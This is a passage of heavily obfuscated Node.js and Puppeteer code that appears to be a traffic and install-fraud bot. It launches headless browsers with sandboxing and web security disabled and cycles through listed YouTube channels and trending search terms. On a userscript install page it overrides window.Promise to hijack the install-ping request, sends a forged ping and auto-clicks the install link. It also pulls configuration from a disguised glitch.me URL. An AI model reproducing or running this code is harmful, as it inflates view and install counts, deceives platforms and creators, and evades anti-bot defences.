-0x796 + 0x2 * 0x1145 | this['bytes'] >>> 0x858 + -0x57d + -0x2be, J[0xe54 + 0x55 * 0x2 + -0xeef * 0x1] = this['bytes'] << 0x1 * -0x150d + -0x69b * -0x3 + 0x1 * 0x13f, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1edc + 0x1981 + -0x384d; J < -0x89b * 0x3 + 0x2643 + -0x611 * 0x2; ++J)
                K = Q[J - (-0xdec + 0x3 * -0x5ad + 0x1ef6)] ^ Q[J - (0x6 * 0x22e + -0xf07 + 0xd * 0x27)] ^ Q[J - (-0xc2b * 0x2 + 0x7 * -0x231 + 0x27bb)] ^ Q[J - (-0x1a05 + -0x45 * -0x75 + 0x4 * -0x15d)], Q[J] = K << -0x244b + -0x515 * 0x1 + 0x2961 * 0x1 | K >>> 0xa35 + -0x2358 * 0x1 + 0x2 * 0xca1;
              for (J = -0x2185 + 0x44 * 0x1f + 0x1949; J < -0x71 * -0x3c + -0x114e + -0x1 * 0x91a; J += -0x1b4 * -0x15 + -0xed * 0x10 + 0x1 * -0x14ef)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1528 + -0x77 * 0x1a + -0x90d | L >>> 0xbf * -0x14 + 0x1c88 + -0xd81) + (M & N | ~M & O) + P + (-0x1a29b * 0x4a3c + 0x4d703521 + 0x1c * 0x4cd53f5) + Q[J] << 0x1999 + 0xaf9 + 0x97 * -0x3e) << 0x15c2 + -0x249d + 0xee0 | P >>> -0x5 * -0x167 + 0x2267 + -0x294f) + (L & (M = M << 0x15b3 + 0x16d1 + -0x2c66 * 0x1 | M >>> 0x943 + -0x35 * -0x5d + -0xe41 * 0x2) | ~L & N) + O + (0x6ab1432 * 0xb + -0x1 * 0x2ea5e3fb + -0x2 * -0x1fe73fb7) + Q[J + (0x208d * 0x1 + 0xb * 0x1ce + -0x3466)] << 0x309 + -0xe95 * -0x2 + -0x1 * 0x2033) << 0xd * 0x168 + 0x28 * -0xb1 + 0x965 | O >>> -0x1 * 0xddb + -0x13 * 0x1de + 0x3170) + (P & (L = L << -0x1e0 + 0xad9 * 0x2 + 0x1a * -0xc2 | L >>> 0x1 * 0x18b6 + -0x392 + -0x1522) | ~P & M) + N + (-0x12954dbf * 0x9 + -0x87a7b649 + -0x3d87d * -0x664d) + Q[J + (-0x3e5 * 0x5 + 0x2f * -0x29 + 0x1b02)] << 0x1b08 + -0x458 + 0x16b * -0x10) << -0x1 * 0x1da7 + 0x1 * 0x17b9 + 0x5f3 | N >>> 0x5 + 0xb03 + -0xaed * 0x1) + (O & (P = P << 0x1827 * 0x1 + -0x4 * 0x88 + -0x15e9 | P >>> 0x3 * -0x5db + 0xc7c + 0x517) | ~O & L) + M + (0x5881 * -0x83e7 + -0x684d * -0x2e33 + 0x7549bba9) + Q[J + (-0x1239 + 0x155 * 0x1 + 0x10e7)] << -0x1f1a + 0xc5 * 0x26 + 0x1dc) << 0xdc5 + 0xf1c * -0x2 + -0xf8 * -0x11 | M >>> 0xf36 + -0x24e5 + 0x15ca) + (N & (O = O << 0xbe + -0xdc9 * -0x1 + -0xe69 | O >>> 0x5 * -0x36f + 0x22 * -0x124 + -0x23d * -0x19) | ~N & P) + L + (-0x305cd9d6 + 0x7e9b43ca * -0x1 + -0x22c373 * -0x7a3) + Q[J + (0x2 * 0x1003 + -0x5 * 0x79 + -0x1da5)] << 0x268a + 0x17ec + -0x41 * 0xf6, N = N << 0x38f * 0x9 + 0x1b84 + -0x3b6d | N >>> -0xf02 + -0xf79 + 0x1e7d;
              for (; J < -0x13e5 + -0x1174 * -0x1 + 0x5 * 0x85; J += -0x3 * 0x7e5 + 0x1cd3 + -0x51f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2cc * -0xb + 0x1 * -0x1fe7 + 0x3eb0 | L >>> 0x2446 + -0x1af + -0x89f * 0x4) + (M ^ N ^ O) + P + (-0x1 * -0x87eb93a1 + -0x87409f * 0x13f + -0x8f77de21 * -0x1) + Q[J] << 0xb1d + 0x381 + -0xe9e) << 0x755 * -0x4 + 0xc4b + 0x887 * 0x2 | P >>> -0x998 + 0xee8 * 0x1 + -0x1f * 0x2b) + (L ^ (M = M << -0xa * -0x227 + 0x1065 * -0x1 + -0x1 * 0x503 | M >>> -0x1b7d * 0x1 + -0x12e9 + 0x948 * 0x5) ^ N) + O + (0x6462a231 + 0x25 * 0x1a2c2c2 + 0xdb * -0x3a83ee) + Q[J + (0x12 * 0x215 + 0x1b94 + -0x94b * 0x7)] << -0x21b3 * 0x1 + 0x2 * 0xb3 + 0x204d) << -0xb * 0x36d + 0x130 * 0x20 + -0x4c | O >>> 0xa32 + 0x2629 + -0x3040) + (P ^ (L = L << 0x39 * 0x76 + -0xade + -0x67 * 0x26 | L >>> -0x2 * 0xeb0 + -0x4a * 0x58 + -0x36d2 * -0x1) ^ M) + N + (-0x1 * 0xbf0cc34 + 0x1 * -0x787c51e5 + -0x2 * -0x79a384dd) + Q[J + (-0x70 * 0x1b + 0xe * 0x229 + -0x126c)] << -0x1640 + 0x13 * -0xac + 0x1f2 * 0x12) << -0x818 + -0x1de3 + -0x980 * -0x4 | N >>> -0x19fe + 0x7 * -0x3d7 + -0x2 * -0x1a7d) + (O ^ (P = P << 0x107d + 0x2495 * -0x1 + 0x1436 | P >>> -0x1a53 + -0x16c5 + -0x105e * -0x3) ^ L) + M + (-0x9e396a20 + 0x135afb22 * -0x2 + -0x133c94c05 * -0x1) + Q[J + (0x5 * 0x131 + -0x2118 + 0x1b26)] << 0x4b * -0x51 + 0x2128 * 0x1 + -0x96d) << -0xf0e * -0x2 + 0x7 * -0x26e + 0xd15 * -0x1 | M >>> 0x2 * -0x1060 + -0x1 * -0x729 + 0x19b2) + (N ^ (O = O << -0x18fd * -0x1 + -0x934 + -0xfab | O >>> 0xb * -0x2f9 + -0x931 + 0x29e6) ^ P) + L + (-0x3b5 * -0x278951 + -0x65bc * -0xeb4e + -0x158972d2 * 0x6) + Q[J + (0x18b6 + 0x101 * -0x13 + -0x59f)] << -0x1 * -0xf3b + 0x56c + 0x14a7 * -0x1, N = N << 0x1 * -0x125b + 0x177d + -0xc * 0x6b | N >>> -0x4 * 0x79b + -0x14c5 + 0x3333;
              for (; J < -0x2 * -0x621 + -0xc62 + -0x1 * -0x5c; J += 0x1267 + -0x25dc + 0x137a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x175 * -0x8 + 0x1 * -0x1eb + 0x8 * -0x137 | L >>> 0x1b * 0x29 + 0x1 * -0xab2 + 0x67a) + (M & N | M & O | N & O) + P - (0x28b4911f + -0x6db44d60 + 0xda3f * 0xd55b) + Q[J] << -0x15 * 0x9a + 0x6b9 * -0x3 + 0x9 * 0x3a5) << 0x1 * -0x6ad + -0xecd + 0x1 * 0x157f | P >>> 0x2a0 + -0x23f4 + 0x216f) + (L & (M = M << 0x241d + -0x1330 * -0x2 + -0x4a5f | M >>> -0x1f + -0x7 * -0x53a + -0x2475) | L & N | M & N) + O - (0xc134dd20 + -0x486adb4b + 0x4ae123 * -0x1b) + Q[J + (-0x35 + -0x1 * 0x1459 + 0x148f)] << 0x120e + -0x224 * -0x5 + -0x1cc2) << 0x1 * 0x25b8 + -0x1 * -0xbf6 + -0x1 * 0x31a9 | O >>> 0x988 + -0x33a * 0xa + 0x16d7 * 0x1) + (P & (L = L << -0x2693 + -0x3 * -0x649 + 0x13d6 | L >>> -0xd6f + -0x21c + 0x1 * 0xf8d) | P & M | L & M) + N - (-0x27b * 0x350da7 + -0x22cb1943 + -0x1 * -0x1174839a4) + Q[J + (-0xc7f + -0x2 * 0x624 + 0x3 * 0x843)] << -0x243f + -0xb1e + -0x1 * -0x2f5d) << -0x11b * 0x5 + -0x2446 * -0x1 + -0x1eba | N >>> 0x61 + 0xdfa * 0x1 + -0xe40) + (O & (P = P << -0x17a0 + 0x1 * 0xeff + 0x8bf | P >>> 0x2e * -0x15 + -0x7 * 0x382 + 0x4e * 0x5d) | O & L | P & L) + M - (-0xb71d9f9b + 0x21149740 * 0x3 + 0xc4c41cff) + Q[J + (0x731 + 0x8 * 0x3af + 0x1253 * -0x2)] << 0x1fb2 * 0x1 + 0x1 * -0x178d + -0x5 * 0x1a1) << 0x1c82 + 0x422 + -0x209f | M >>> -0x1970 + 0x2ae + 0x16dd * 0x1) + (N & (O = O << -0x1 * 0x1da7 + -0x204a + 0x3e0f | O >>> 0x1 * 0x74b + 0xc5d + -0x1 * 0x13a6) | N & P | O & P) + L - (0xd7 * 0xb990ef + -0x27bd95 + 0x800 * -0x55997) + Q[J + (-0x1a1b + 0x4e8 + 0x1537)] << -0x21f9 + -0x2 * -0x617 + -0x31d * -0x7, N = N << 0x68e * -0x1 + -0x1d81 + -0x3f * -0x93 | N >>> 0x1502 * 0x1 + 0x1cb5 + -0x31b5;
              for (; J < -0xb8c + 0x1575 + -0x999; J += -0x18c7 * -0x1 + 0x1c6 * -0x1 + 0x5bf * -0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x23d7 + -0x3 * 0xbab + -0xd1 | L >>> 0x1 * -0x26d3 + -0x1fbf + -0x3 * -0x178f) + (M ^ N ^ O) + P - (0x4805216a + -0x3eb * 0xd184b + -0x73deb * -0x48b) + Q[J] << -0x2ca * 0x1 + 0x25ee + -0x2324) << 0x383 + 0x83f * -0x2 + 0xd00 | P >>> -0x8ad * -0x2 + -0x1 * -0xc5a + -0x1 * 0x1d99) + (L ^ (M = M << 0x7 * 0x305 + -0xab6 * -0x2 + -0x2a71 | M >>> 0x3 * -0x3df + -0x8 * -0x1bd + -0x249) ^ N) + O - (0x3f6e8426 + 0x1501f705 + -0x1ed33d01) + Q[J + (-0x19 * 0xa + 0x1a16 + 0x191b * -0x1)] << 0x1 * -0x267 + -0x5d5 * 0x1 + 0x83c) << -0x1 * 0x2523 + -0x9df + -0x3 * -0xfad | O >>> 0x1f51 + -0x7 * 0x342 + -0x10d * 0x8) + (P ^ (L = L << -0x231b + -0x22fe + 0x1 * 0x4637 | L >>> -0x17 * 0x1a3 + 0x4 * 0x107 + 0x218b) ^ M) + N - (0xd * 0x7015779 + -0x46ac8762 + 0x3b0ecef * 0x9) + Q[J + (0x1 * -0x19cf + -0x12ee + 0x5 * 0x8f3)] << -0xa77 + 0x24fa * -0x1 + 0x97d * 0x5) << 0x66b * -0x1 + -0x1cbf * 0x1 + -0x232f * -0x1 | N >>> -0x15c5 + 0x1a77 + -0x497) + (O ^ (P = P << -0x1 * 0x9f7 + 0x8d * 0x3f + -0x1 * 0x189e | P >>> 0x18de + 0x272 * 0x2 + 0x10 * -0x1dc) ^ L) + M - (-0xda47a8b + -0x138001e0 + 0x56c1ba95) + Q[J + (-0xfb * 0xd + 0x17d9 + -0xb17)] << 0x13fb * -0x1 + 0x3 * 0xc1f + -0x1062) << -0x1 * -0x10ba + 0x104 * 0x20 + -0x3c9 * 0xd | M >>> -0x2173 * 0x1 + 0x1 * -0x1be5 + 0x3d73) + (N ^ (O = O << 0x213a + 0x1a56 + -0x3b72 | O >>> 0x3 * 0xa13 + -0x187 * -0x1 + -0x1fbe) ^ P) + L - (-0xe0995d6 * 0x1 + -0x4dbc6e0 + 0x48829ae0) + Q[J + (0x58a + -0xa9f * -0x3 + -0x2563)] << -0x2303 + 0x39f + 0x2 * 0xfb2, N = N << 0x31c + -0x23c8 + 0x20ca | N >>> 0x1692 + -0x4 * -0x807 + -0x36ac;
              this['h0'] = this['h0'] + L << -0x3 * 0xc92 + -0x6 * 0xf7 + 0x40 * 0xae, this['h1'] = this['h1'] + M << 0x1 * 0x13d7 + 0x125 * -0x1 + -0x12b2, this['h2'] = this['h2'] + N << -0x2 * -0xa9 + 0x481 * -0x2 + 0x7b0, this['h3'] = this['h3'] + O << 0x239 * -0x3 + 0xc11 * -0x3 + 0x76 * 0x5d, this['h4'] = this['h4'] + P << 0x10 * 0x254 + 0x218a + 0x215 * -0x22;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2c4 * -0x4 + -0x860 + 0x3 * 0x684 & -0x2583 + 0x25fc * -0x1 + 0x4b8e] + w[J >> -0x4e9 * 0x2 + -0x2 * 0x1017 + -0x2a18 * -0x1 & -0xe17 * -0x1 + 0x2 * -0x25b + -0x952] + w[J >> 0x11ca + 0x1031 + -0x21e7 & 0x185 * -0x13 + 0x15f + 0x5 * 0x583] + w[J >> -0x1b61 + 0x913 + 0x92f * 0x2 & 0x14eb + 0x1 * 0x4ab + -0x1987] + w[J >> -0x2401 * -0x1 + 0xb91 * -0x1 + -0x1864 & 0x5b5 + 0xc89 * 0x3 + -0x2b41] + w[J >> 0x2602 + 0x19c5 + -0x3fbf & 0x25f6 + 0xbe7 + -0x31ce * 0x1] + w[J >> -0x19d2 + -0x2 * 0x103c + 0x22 * 0x1b7 & 0xbd7 + 0x2 * -0x3af + -0x235 * 0x2] + w[0x589 * -0x2 + 0x745 * -0x1 + 0x1266 & J] + w[K >> 0x593 * 0x4 + -0x1500 + -0x130 & -0x2f * 0x63 + -0x12 * -0x19f + -0x3 * 0x3a6] + w[K >> -0x22a + 0x1a64 + -0x1822 & -0x1 * -0x1557 + 0x30c + 0x12 * -0x15a] + w[K >> -0xf3b + -0x1ed + -0x2 * -0x89e & -0x2 + -0xb3e + 0xb4f] + w[K >> -0x7f1 + -0x8c5 + 0x10c6 & 0x9a * -0xb + -0xf3a + 0x15e7] + w[K >> -0xa6 * -0x26 + 0xdbf + -0x7ab * 0x5 & 0x959 + -0x169c + -0xa * -0x155] + w[K >> 0xc3 * -0x1c + 0x1d * 0x139 + -0x4b3 * 0x3 & -0x389 + -0x180b + 0x1ba3] + w[K >> -0xade * 0x3 + 0x139d + 0xd01 & -0x1 * -0x10a7 + -0x6ce + 0x1 * -0x9ca] + w[0x4d2 + -0x1 * 0xe09 + 0x946 & K] + w[L >> -0x1769 + 0x84 * -0x26 + 0x2b1d & 0x1d * -0x12b + -0x983 * 0x3 + 0x3e77] + w[L >> -0x2090 + -0x1aa1 + -0x13c3 * -0x3 & -0x745 + -0x1b16 * 0x1 + -0x1 * -0x226a] + w[L >> -0x1 * 0x10 + 0x21 * -0x29 + 0x56d & 0x33e + 0x2573 * -0x1 + 0x2244] + w[L >> -0xd01 * -0x3 + -0x2246 + -0x85 * 0x9 & 0x2 * -0x19a + 0x196b + -0x1628] + w[L >> -0x1bd + 0x23f4 + 0x1 * -0x222b & -0x1c19 * -0x1 + 0x3 * 0x3d6 + -0x278c] + w[L >> 0x611 * -0x6 + 0x85e + -0x2 * -0xe08 & 0x46 * 0x25 + -0x2118 * -0x1 + -0x1 * 0x2b27] + w[L >> -0x116 * -0x2 + 0x1 * -0x1c8d + -0xe9 * -0x1d & -0xd * -0x2ce + -0x794 + -0x1cd3] + w[-0x1 * 0xb76 + -0x1 * -0x1113 + -0x4f * 0x12 & L] + w[M >> -0x1acd + 0x1 * -0x221f + 0x3d08 & -0x5 * -0x2c7 + -0x11b5 + 0x3e1] + w[M >> 0xb1 * -0xb + -0x1614 + -0x441 * -0x7 & 0x2c6 * 0x6 + -0x1c2b + 0xb96] + w[M >> 0x9a7 + -0x57 * -0x48 + -0x220b & -0x19 * 0xc1 + 0x2174 + -0xe8c] + w[M >> -0xdb2 * 0x1 + 0x1ba4 + 0x2 * -0x6f1 & -0x5 * -0x30d + -0x138 * -0x18 + 0x2 * -0x1639] + w[M >> -0x13 * -0xde + -0x1 * -0x1c2d + 0x1 * -0x2c9b & 0x44b * 0x1 + 0x1f9d * -0x1 + 0x1b61] + w[M >> 0x2400 + -0x5 * 0x50b + -0xac1 & 0x1c66 + -0x17 * -0x13a + -0x388d] + w[M >> -0xd22 + 0x3 * -0x93f + 0x28e3 & 0x238b + -0x1cfb + -0x681] + w[-0xd43 + -0x1fdb + 0x5 * 0x909 & M] + w[N >> -0x2212 + 0x61b + 0x1c13 & 0x26 * -0x5 + 0x2455 + 0x2 * -0x11c4] + w[N >> -0x1 * -0x1019 + 0xc37 + 0x2 * -0xe1c & 0x174c + 0x4 * 0x3c7 + 0x2659 * -0x1] + w[N >> -0x63c + 0x235 + -0x1 * -0x41b & 0x7d8 + 0x17 * 0x69 + 0x1d * -0x98] + w[N >> -0x7b * 0x4f + 0x8f1 * 0x4 + 0x241 & 0xec * -0x10 + 0x3 * -0x4ed + 0x1d96] + w[N >> -0x21ae + -0x1 * 0x166f + 0x1 * 0x3829 & -0x14 * -0x1b6 + 0x21 * -0x97 + -0xeb2] + w[N >> -0x16 * 0xc0 + -0x713 + -0x179b * -0x1 & 0xf37 + 0x13a6 * -0x1 + 0x2e * 0x19] + w[N >> -0x27a * -0x3 + 0x1e81 + -0x25eb & -0x221f + -0x4a * 0x81 + 0x8ef * 0x8] + w[0x1593 + 0x1975 + 0xb9 * -0x41 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x16 * -0x12f + 0x18d5 + 0x10ed * -0x3 & -0x1 * 0xfb + 0x1f7a + 0xec0 * -0x2,
                J >> 0x201f + -0x192f + -0x6e0 & 0x1 * 0x12d1 + -0x1ac + -0x1026,
                J >> -0xf6 * 0x23 + 0xa55 * 0x2 + 0xd00 & 0x1 * 0x16a1 + 0xc2b + -0x21cd,
                0xab6 * 0x3 + -0xc51 + -0x12d2 & J,
                K >> 0x1 * 0x19cb + 0x4a1 + -0x795 * 0x4 & 0xad * -0x2b + -0xfc9 * 0x1 + 0x5 * 0x92b,
                K >> 0x13a * 0x18 + -0x15a3 + -0x7bd & 0x1e08 * -0x1 + -0x170b + -0x602 * -0x9,
                K >> 0x137a + 0x2003 + -0x1127 * 0x3 & -0x243 + -0x30a * 0x4 + 0xf6a,
                0x115 * -0x15 + 0x1bd * -0x10 + 0xce2 * 0x4 & K,
                L >> -0x1c12 + 0x1142 + 0xae8 & 0x11 * -0x21f + -0x13 * -0xe5 + 0x140f,
                L >> 0x1 * -0x1ad8 + 0x1678 + 0x470 & 0x1c6f + 0x66 + -0x1 * 0x1bd6,
                L >> 0x2c * 0xc7 + 0x1 * 0x315 + -0x2541 & -0x3 * 0x93f + 0xc97 + 0x1025,
                0x22bf + 0x1 * -0x67a + -0x1 * 0x1b46 & L,
                M >> -0x220e + -0x1 * 0x15eb + -0x3811 * -0x1 & -0x2126 * 0x1 + -0x658 * 0x2 + 0x2ed5,
                M >> 0xe3 * 0x23 + -0x803 + -0x2 * 0xb7b & -0x68b * 0x3 + 0x204a + -0xbaa,
                M >> 0x1a69 * 0x1 + -0xf56 + -0xb * 0x101 & 0x13ce + -0x1685 + -0xa * -0x5f,
                -0xb8e + 0x1cdf + -0x1052 & M,
                N >> 0x19a2 + 0x6 * -0x4e5 + 0xa * 0x62 & -0x12ee + 0x1 * -0x97d + -0xfb * -0x1e,
                N >> -0x1 * 0xac0 + -0x7d0 + 0x12a0 & 0x16f3 + 0x239 * 0xa + -0x2c2e,
                N >> -0x252 + -0x204c + -0xa * -0x377 & 0x1 * 0x101 + 0xe15 + -0xe17,
                0xca + -0x168f + -0x2f * -0x7c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x25b1 * -0x1 + -0x50f * 0x7 + 0xc * -0x2f), (K = new DataView(J))['setUint32'](-0xc7 * 0x29 + 0x314 + -0x237 * -0xd, this['h0']), K['setUint32'](-0x1 * -0xd64 + -0xd7d + 0x1d, this['h1']), K['setUint32'](0x1 * 0x1b25 + 0x1 * 0x21d2 + -0x3cef, this['h2']), K['setUint32'](0x3 * 0x6cd + -0x12fe + 0x15d * -0x1, this['h3']), K['setUint32'](-0x234b + 0x166c + 0xcef, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem'](X(0xc) + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1577 + 0xbec + -0x2163];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1269 + -0x1 * 0xf73 + 0x21dc;
            J[-0x49 * 0x1d + 0xbac + -0x1 * 0x367]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xf8c + -0xbb4 * -0x2 + -0x26f4] = L => {
              const Y = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I[Y(0xf) + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1871 + -0x3 * 0x9ca + 0x7 * 0x7b0), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1a * 0x34 + 0x2 * -0x9d0 + -0xe59 * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2 * -0x19f + 0x7ac * 0x1 + -0x1 * -0x16e), Promise['resolve'](-0x1 * 0x1408 + 0x8a2 + 0xb67);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x249a + 0x223 * 0x8 + 0x1382; j < 0x2524 + 0x6 * 0x28a + -0x345f; j++)
    i();
}
const NETWORK_PATIENCE = 0xb17 * 0x1 + -0x1 * 0x26bb + 0x3ae4 + (0x1dd2 + -0x649 + -0x1 * 0xbd1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x36 * -0x13 + -0xb61 + 0x762) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x3 * 0x602 + 0x140a + -0x2610);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1107 + -0x1 * -0x901 + -0x806 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const Z = d;
    let i = this[floor(random() * this['length'])];
    f[Z(0x1)](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x2637 * -0x1 + 0x2600 + -0x4c2d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2 * -0x1b + 0xc * 0x10a + 0xc38 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + a0(0x10) + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 